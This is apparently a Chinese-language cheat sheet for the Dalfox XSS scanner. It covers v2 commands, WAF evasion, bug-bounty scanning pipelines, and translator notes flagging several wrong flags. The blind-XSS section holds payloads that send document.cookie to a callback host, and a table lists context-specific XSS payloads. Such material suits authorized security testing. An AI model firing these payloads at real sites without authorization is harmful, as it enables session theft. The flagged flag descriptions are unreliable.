# 🦊 Dalfox - XSS 扫描框架

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

> **版本说明：** 本文主要保留 Dalfox v2 的 Go 安装路径、`url` / `file` / `pipe` 子命令及参数。当前 v3 已用 Rust 重写，扫描入口与部分参数发生变化，不能将这些示例直接视为当前版本的完整用法。参见 [官方 v2 迁移说明](https://dalfox.hahwul.com/getting-started/migration/)。服务器示例还将自定义端口 `8080` 与请求示例中的 `8090` 混用，请求端口必须与实际监听配置一致。
>
> **参数勘误：** 扫描命令中的 `-p` 指选择待测试参数，并非直接提供单条载荷；自定义载荷文件使用 `--custom-payload`。v2.12.0 的 `--only-poc` 需要指定结果类别，并非简单布尔开关；其中也未定义 `--basic-auth`。原文的 `--skip-mining` 与“忽略指纹”描述不符，参数挖掘与 WAF 指纹识别是不同步骤。`--waf-evasion` 在 v2 中主要通过调整速率规避限制，并不保证绕过 WAF。参见 [v2.12.0 官方参数定义](https://github.com/hahwul/dalfox/blob/v2.12.0/cmd/root.go)。
>
> **结果解读：** 回显、字符串匹配、外部 HTTP 回调和浏览器实际执行脚本的证明力不同，应结合上下文核实。`gf xss` 只筛选候选 URL；回调服务的可用性、CSP、HttpOnly 及浏览器行为也会影响盲 XSS 示例。所有载荷、JSON/HTTP 示例及命令保持原样。

```
  ██████╗  █████╗ ██╗     ███████╗ ██████╗ ██╗  ██╗
  ██╔══██╗██╔══██╗██║     ██╔════╝██╔═══██╗╚██╗██╔╝
  ██║  ██║███████║██║     █████╗  ██║   ██║ ╚███╔╝ 
  ██║  ██║██╔══██║██║     ██╔══╝  ██║   ██║ ██╔██╗ 
  ██████╔╝██║  ██║███████╗██║     ╚██████╔╝██╔╝ ██╗
  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝
         强大的 XSS 扫描与分析工具
```

<p align="center">
  <img src="https://img.shields.io/badge/Dalfox-XSS_Scanner-blue?style=for-the-badge" alt="Dalfox">
  <img src="https://img.shields.io/badge/Reflected_XSS-green?style=for-the-badge" alt="Reflected">
  <img src="https://img.shields.io/badge/Bug_Bounty-red?style=for-the-badge" alt="Bug Bounty"><br>
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

---

## 📋 目录

- [什么是 Dalfox](#-what-is-dalfox)
- [安装](#-installation)
- [基本用法](#-basic-usage)
- [扫描模式](#-scanning-modes)
- [高级选项](#-advanced-options)
- [盲 XSS（Blind XSS）](#-blind-xss)
- [速查](#-quick-reference)

---

<a id="-what-is-dalfox"></a>
## 🎯 什么是 Dalfox

**Dalfox** 是一款强大的 XSS（跨站脚本）漏洞扫描与分析工具：

- 🔍 **参数分析** - 查找输入回显点
- 🎯 **XSS 检测** - 反射型与 DOM 型
- 💉 **盲 XSS（Blind XSS）** - 带外测试（OOB）
- ⚡ **快速** - 基于 Go，支持高并发（原文描述 v2）

### 为什么选择 Dalfox？

| 功能 | 优势 |
|---------|---------|
| 智能分析 | 根据上下文选择载荷 |
| WAF 检测 | 绕过常见 WAF（能力取决于具体环境） |
| 盲 XSS（Blind XSS） | 支持带外交互 |
| 参数挖掘模式 | 从 JS 中查找参数 |

---

<a id="-installation"></a>
## 🚀 安装

```bash
# 使用 Go 安装（推荐）
go install github.com/hahwul/dalfox/v2@latest

# Homebrew（macOS）
brew install dalfox

# Snap（Linux）
sudo snap install dalfox

# 验证
dalfox version
```

---

<a id="-basic-usage"></a>
## 📖 基本用法

### 单个 URL

```bash
# 基础扫描
dalfox url https://example.com/search?q=test

# 保存输出
dalfox url https://example.com/search?q=test -o results.txt
```

### 多个 URL

```bash
# 从标准输入读取
cat urls.txt | dalfox pipe

# 从文件读取
dalfox file urls.txt

# 设置并发
cat urls.txt | dalfox pipe -w 50
```

### 静默模式

```bash
# 仅显示漏洞结果
dalfox url https://example.com/search?q=test --silence

# 无颜色输出
dalfox url https://example.com/search?q=test --no-color
```

---

<a id="-scanning-modes"></a>
## 🔎 扫描模式

### URL 模式

```bash
# 扫描单个 URL
dalfox url https://example.com/page?param=value

# 携带数据进行扫描
dalfox url https://example.com/page?param=value -d "post_param=value"
```

### 管道模式

```bash
# 从标准输入读取
echo "https://example.com/search?q=test" | dalfox pipe

# 多个 URL
cat urls_with_params.txt | dalfox pipe
```

### 文件模式

```bash
# 从文件读取
dalfox file urls.txt

# 指定输出
dalfox file urls.txt -o results.txt
```

### 服务器模式

```bash
# 启动 API 服务器
dalfox server

# 自定义端口
dalfox server -p 8080

# 然后发送请求：
# POST http://localhost:8090/scan
# {"url": "https://example.com/search?q=test"}
```

---

<a id="-advanced-options"></a>
## ⚙️ 高级选项

### 自定义请求头

```bash
# 添加请求头
dalfox url https://example.com/search?q=test -H "Authorization: Bearer token"

# 多个请求头
dalfox url https://example.com/search?q=test \
  -H "Cookie: session=abc" \
  -H "X-Forwarded-For: 127.0.0.1"
```

### Cookie 与身份验证

```bash
# 携带 Cookie
dalfox url https://example.com/search?q=test -C "session=abc123"

# Basic 身份验证（参数适用性见译注）
dalfox url https://example.com/search?q=test --basic-auth "user:pass"
```

### 自定义载荷

```bash
# 使用自定义载荷文件
dalfox url https://example.com/search?q=test --custom-payload payloads.txt

# 单个自定义载荷（原文误用了 -p，见译注）
dalfox url https://example.com/search?q=test -p '<script>alert(1)</script>'

# 文件中的载荷格式：
# <script>alert(1)</script>
# <img src=x onerror=alert(1)>
# <svg onload=alert(1)>
```

### 输出格式

```bash
# JSON 输出
dalfox url https://example.com/search?q=test --format json -o result.json

# 仅漏洞结果
dalfox url https://example.com/search?q=test --only-poc
```

### 性能

```bash
# 设置工作线程数（并发）
dalfox url https://example.com/search?q=test -w 100

# 超时（秒）
dalfox url https://example.com/search?q=test --timeout 10

# 请求间延迟（毫秒）
dalfox url https://example.com/search?q=test --delay 100
```

### WAF 规避

```bash
# 使用 WAF 规避
dalfox url https://example.com/search?q=test --waf-evasion

# 忽略指纹（原文把参数挖掘与指纹识别混淆，见译注）
dalfox url https://example.com/search?q=test --skip-mining
```

### 代理

```bash
# HTTP 代理
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080

# 用于 Burp Suite
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080
```

---

<a id="-blind-xss"></a>
## 💉 盲 XSS（Blind XSS）

### 使用盲 XSS 载荷

```bash
# 配合 XSS Hunter / Burp Collaborator
dalfox url https://example.com/form?input=test -b "https://your.xss.ht"

# -b 参数用于添加盲 XSS 回调
```

### 盲 XSS 配合自定义载荷

```bash
# 自定义盲 XSS 载荷
dalfox url https://example.com/form?name=test \
  --blind "https://your.xss.ht" \
  --custom-payload blind_payloads.txt
```

### 盲 XSS 载荷示例

```html
"><img src=x onerror="fetch('https://your.xss.ht/'+document.cookie)">
"><script src="https://your.xss.ht"></script>
'"><script>new Image().src="https://your.xss.ht/?c="+document.cookie</script>
```

---

<a id="-quick-reference"></a>
## 📊 速查

### 基础命令

| 命令 | 说明 |
|---------|-------------|
| `dalfox url URL` | 扫描单个 URL |
| `dalfox file file.txt` | 从文件扫描 |
| `cat urls \| dalfox pipe` | 从标准输入扫描 |
| `dalfox server` | 启动 API 服务器 |

### 常用参数

| 参数 | 说明 |
|------|-------------|
| `-o file.txt` | 输出文件 |
| `-w 50` | 工作线程数（并发） |
| `-H "Header: value"` | 自定义请求头 |
| `-C "cookie=value"` | Cookie |
| `-b "url"` | 盲 XSS 回调 |
| `--proxy URL` | HTTP 代理 |
| `--timeout 10` | 请求超时 |

### 输出选项

| 参数 | 说明 |
|------|-------------|
| `--format json` | JSON 输出 |
| `--only-poc` | 仅显示 PoC（概念验证） |
| `--silence` | 静默模式 |
| `--no-color` | 无颜色输出 |

### 载荷选项

| 参数 | 说明 |
|------|-------------|
| `-p "payload"` | 自定义载荷（原文的 -p 标注有误，见译注） |
| `--custom-payload file` | 载荷文件 |
| `--waf-evasion` | WAF 规避模式 |

---

## 🎯 漏洞赏金工作流程

### 基础 XSS 扫描

```bash
# 快速扫描
dalfox url "https://target.com/search?q=test" --silence
```

### 从 URL 收集结果开始

```bash
# GAU + Dalfox
gau target.com | grep "=" | dalfox pipe -o xss_results.txt

# Wayback + Dalfox
echo target.com | waybackurls | grep "=" | dalfox pipe --silence
```

### 批量扫描

```bash
# 扫描 URL 中的所有参数
cat all_urls.txt | grep "?" | dalfox pipe -w 100 -o found_xss.txt
```

### 配合 GF 模式

```bash
# 使用 GF + Dalfox
gau target.com | gf xss | dalfox pipe --silence

# 使用 httpx 过滤
gau target.com | gf xss | httpx -silent | dalfox pipe
```

### 经过身份验证的扫描

```bash
# 携带会话信息
dalfox url "https://target.com/dashboard?search=test" \
  -C "session=abc123" \
  -H "Authorization: Bearer token" \
  -o auth_xss.txt
```

### 综合管道

```bash
# 完整 XSS 挖掘管道
subfinder -d target.com -silent | \
  httpx -silent | \
  gau | \
  gf xss | \
  uro | \
  dalfox pipe -w 50 --silence -o xss_vulnerabilities.txt
```

### 盲 XSS 测试活动

```bash
# 批量盲 XSS 测试
cat contact_forms.txt | dalfox pipe -b "https://your.xss.ht" --silence

# 专门针对输入表单
cat form_urls.txt | dalfox pipe \
  -b "https://your.xss.ht" \
  --custom-payload blind_xss.txt \
  -w 10
```

---

## 💡 XSS 挖掘建议

1. **检查所有参数** - 不要只检查明显的参数
2. **测试不同上下文** - HTML、JS、属性
3. **使用盲 XSS** - 用于管理面板、日志等场景
4. **与开放重定向组合** - 评估是否能扩大影响
5. **检查响应头** - CSP, X-XSS-Protection
6. **测试 POST 参数** - 这类参数常被忽略

### 常见 XSS 注入点

```
- 搜索框
- 用户资料字段
- 评论/反馈
- URL 参数
- HTTP 请求头（Referer、User-Agent）
- 上传文件的文件名
- 错误消息
```

### 不同上下文的载荷

| 上下文 | 载荷 |
|---------|---------|
| HTML | `<script>alert(1)</script>` |
| 属性 | `" onmouseover="alert(1)"` |
| JavaScript | `';alert(1)//` |
| URL | `javascript:alert(1)` |

---

## 📚 参考资源

- [Dalfox GitHub](https://github.com/hahwul/dalfox)
- [XSS 载荷](https://github.com/payloadbox/xss-payload-list)

### 相关速查表
- [漏洞赏金方法论](../../Bug-Bounty-Methodology/README.md)
- [XSS 载荷](../../Payloads/XSS.md)
- [Burp Suite](../../Burp-Suite/README.md)

---

<p align="center">
  <b>🦊 发现 XSS 漏洞！</b><br>
  <i>Dalfox——XSS 挖掘者的好帮手</i>
</p>
